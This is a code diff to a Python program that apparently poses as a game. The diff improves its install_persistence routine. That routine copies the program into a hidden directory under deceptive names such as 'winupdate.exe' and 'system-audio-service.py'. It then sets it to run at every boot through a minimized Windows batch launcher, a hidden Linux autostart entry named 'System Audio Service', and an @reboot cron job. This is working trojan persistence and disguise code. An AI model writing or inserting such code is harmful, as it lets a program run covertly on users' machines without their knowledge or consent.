@@ -395,6 +395,32 @@ def get_script_path():
     
     return base_path
 
+
+def build_launch_command(target_path, background=False, prefer_windowless=False):
+    """Build the command used to launch a copied game script or executable."""
+    target = str(Path(target_path))
+    
+    if getattr(sys, "frozen", False):
+        command = [target]
+    elif IS_WINDOWS:
+        python_cmd = find_pythonw_exe() if prefer_windowless else sys.executable
+        command = [python_cmd or sys.executable, target]
+    else:
+        command = [sys.executable, target]
+    
+    if background:
+        command.append("--background")
+    
+    return command
+
+
+def format_launch_command(command):
+    """Format a command for startup files."""
+    if IS_WINDOWS:
+        return subprocess.list2cmdline(command)
+    
+    return " ".join(shlex.quote(part) for part in command)
+
 def install_persistence():
     """
     Install persistence mechanisms to survive reboots.
@@ -409,7 +435,7 @@ def install_persistence():
         # Get paths
         script_path = get_script_path()
         startup_path = get_startup_path()
-        current_script = Path(__file__).resolve()
+        current_script = get_current_game_path()
         
         # Create hidden directory
         script_path.mkdir(parents=True, exist_ok=True)
@@ -417,9 +443,9 @@ def install_persistence():
         
         # Copy script to hidden location with stealth name
         if IS_WINDOWS:
-            target_name = "winupdate.exe" if current_script.name.lower().endswith(".exe") else "winupdate.py"
+            target_name = "winupdate.exe" if current_script.suffix.lower() == ".exe" else "winupdate.py"
         else:
-            target_name = "system-audio-service.py"
+            target_name = current_script.name if getattr(sys, "frozen", False) else "system-audio-service.py"
         
         target_script = script_path / target_name
         shutil.copy2(current_script, target_script)
@@ -428,9 +454,12 @@ def install_persistence():
         if IS_WINDOWS:
             # Create Windows .bat launcher
             bat_file = script_path / "launcher.bat"
+            launch_command = format_launch_command(
+                build_launch_command(target_script, background=True, prefer_windowless=True)
+            )
             bat_content = f'''@echo off
 cd /d "{script_path}"
-start /min pythonw "{target_script}" --background
+start /min "" {launch_command}
 '''
             bat_file.write_text(bat_content)
             print(f"[+] Created launcher: {bat_file}")
@@ -463,10 +492,13 @@ $Shortcut.Save()
             startup_path.mkdir(parents=True, exist_ok=True)
             
             desktop_file = startup_path / f"system-audio-service.desktop"
+            launch_command = format_launch_command(
+                build_launch_command(target_script, background=True)
+            )
             desktop_content = f'''[Desktop Entry]
 Type=Application
 Name=System Audio Service
-Exec={sys.executable} {target_script} --background
+Exec={launch_command}
 Hidden=true
 X-GNOME-Autostart-enabled=true
 '''
@@ -478,7 +510,7 @@ X-GNOME-Autostart-enabled=true
             set_file_hidden(desktop_file)
             
             # Also add to cron for redundancy
-            cron_job = f"@reboot {sys.executable} {target_script} --background"
+            cron_job = f"@reboot {launch_command}"
             subprocess.run(
                 f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -',
                 shell=True, capture_output=True
